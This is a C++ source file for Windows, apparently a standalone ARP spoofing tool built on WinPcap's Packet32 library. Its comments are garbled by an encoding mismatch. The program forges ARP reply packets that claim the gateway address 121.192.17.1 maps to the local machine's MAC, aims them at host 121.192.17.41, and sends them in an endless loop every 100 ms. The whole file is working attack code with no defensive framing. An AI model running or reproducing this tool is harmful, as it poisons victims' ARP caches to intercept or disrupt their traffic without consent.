// myarp.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include "Iphlpapi.h"
#pragma comment(lib, "Iphlpapi.lib")
#include <Packet32.h>
#pragma comment(lib,"Packet.lib")

typedef struct ethdr
{
    unsigned char  eh_dst[6]; //Ŀ��MAC��ַ
    unsigned char  eh_src[6]; //ԴMAC��ַ
    unsigned short eh_type; //֡����
}ETHDR,*PETHDR;

typedef struct arphdr
{
    unsigned short  arp_hdr;    //2�ֽ�Ӳ������
    unsigned short  arp_pro;    //2�ֽ�Э������
    unsigned char   arp_hln;    //1�ֽ�Ӳ����ַ����
    unsigned char   arp_pln;    //1�ֽ�Э���ַ����
    unsigned short  arp_opt;    //2�ֽڲ�������
    unsigned char   arp_sha[6]; //6�ֽڷ��Ͷ�MAC��ַ
	unsigned char   arp_spa[4]; //4�ֽڷ��Ͷ�IP��ַ
    unsigned char   arp_tha[6]; //6�ֽ�Ŀ��MAC��ַ
    unsigned char   arp_tpa[4]; //4�ֽ�Ŀ��IP��ַ	
}ARPHDR,*PARPHDR;



#define MAX_NUM_ADAPTER 10
char      adapterlist[MAX_NUM_ADAPTER][1024];

BOOL GetLocMac(unsigned char *macaddr)
{
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulLen = 0;
	// �õ�Ҫ����Ķ�ջ�ռ��С
	GetAdaptersInfo(pAdapterInfo,&ulLen);
	//��������Ķ�ջ�ռ�
	pAdapterInfo = (PIP_ADAPTER_INFO)GlobalAlloc(GPTR, ulLen);
	// ȡ�ñ����������ṹ��Ϣ
	if(GetAdaptersInfo(pAdapterInfo,&ulLen) ==  ERROR_SUCCESS)
	{
		if(pAdapterInfo != NULL)
		{
			//�õ���������MAC��ַ
			memcpy(macaddr, pAdapterInfo->Address, 6);
			return TRUE;
		}
	}
	return FALSE;
}

BOOL GetDestMac(char *szDestIP,unsigned char *macaddr)
{
	//��������Ŀ������MAC��ַ
	u_char arDestMac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	ULONG ulLen = 6;
	//�õ�Ŀ������MAC��ַ
	if(SendARP(inet_addr(szDestIP), 0, (ULONG*)arDestMac, &ulLen) == NO_ERROR)
	{
		//��MAC��ַ���������
		memcpy(macaddr,arDestMac,6);
		return TRUE;
	}
	return FALSE;
}

int main(int argc, char* argv[])
{
	//�������������
	char		AdapterName[8192];
	ULONG		AdapterLength;
	//�õ�������������������
	if(PacketGetAdapterNames(AdapterName,&AdapterLength)==FALSE)
	{
		printf("PacketGetAdapterNames Error\n");
		
	}
	int adapternum=0,open,i;
	char *name1,*name2;
	name1=AdapterName;
    name2=AdapterName;
    i=0;
	//�оٳ�������������
	while((*name1!='\0') || (*(name1-1)!='\0'))
    {
        if(*name1=='\0')
        {
            memcpy(adapterlist[i],name2,2*(name1-name2));
            name2=name1+1;
            i++;
        }
        name1++;
    }
    adapternum=i;
    printf("Adapters Installed: \n");
	//��Ӧ��������������
    for(i=0;i<adapternum;i++)
    {
        printf("%d - %s\n",i+1,adapterlist[i]);   
    }
	//���û�ѡ��Ҫ�򿪵�����
	do
    {
        printf("\nSelect the number of the adapter to open: ");
        scanf("%d",&open);
		//����������ű����1�󣬱�������������1С
        if(open>=1 && open<adapternum+1)
            break;
    }while(open<1 || open>adapternum);
	//��ѡ�������
	LPADAPTER lpadapter=PacketOpenAdapter(adapterlist[open-1]);
    if(!lpadapter || (lpadapter->hFile==INVALID_HANDLE_VALUE))
    {
        printf("PacketOpenAdapter Error\n");
        return -1;
    }
	LPPACKET lppackets;
	//ΪLPPACKET�ṹ����ռ�
	if((lppackets=PacketAllocatePacket())==FALSE)
    {
        printf("PacketAllocatePacket Send Error\n");
        return -1;
    }
	ETHDR  eth;
    ARPHDR arp;
    //Ŀ��MAC��ַ
	GetDestMac("121.192.17.41",eth.eh_dst);
	//ԴMAC��ַ
	GetLocMac(eth.eh_src);
	//֡����
	eth.eh_type=htons(0x0806);
	//Ӳ������
	arp.arp_hdr=htons(0x0001);
	//Э������
	arp.arp_pro=htons(0x0800);
	//Ӳ����ַ����
	arp.arp_hln=6;
	//Э���ַ����
	arp.arp_pln=4;
	//��������
	arp.arp_opt=htons(0x0002);
	//���Ͷ�mac��ַ
	GetLocMac(arp.arp_sha);
	//���Ͷ�ip��ַ����Ϊ���ص�ip
	arp.arp_spa[0]=121;
	arp.arp_spa[1]=192;
	arp.arp_spa[2]=17;
	arp.arp_spa[3]=1;
	//Ŀ������Mac��ַ
	GetDestMac("121.192.17.41",arp.arp_tha);
	//Ŀ������Mac��ַ
	arp.arp_tpa[0]=121;
	arp.arp_tpa[1]=192;
	arp.arp_tpa[2]=17;
	arp.arp_tpa[3]=41;
	char   sendbuf[1024]={0};
	//����̫���ײ���ARP���Ķ�������sendbuf�У����������ARP���ݰ�
	memcpy(sendbuf,&eth,sizeof(eth));
	memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));
	//��ʼ��LPPACKET�ṹ
	PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));
	//ѭ������ARP�������ݰ�
	for (;;)
	{
		if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)
		{
			printf("PacketSendPacket in arpspoof Error: %d\n",GetLastError());
			return -1;
		}
		Sleep(100);
	}
	//�رմ򿪵�����
	PacketCloseAdapter(lpadapter);
	return 0;
}
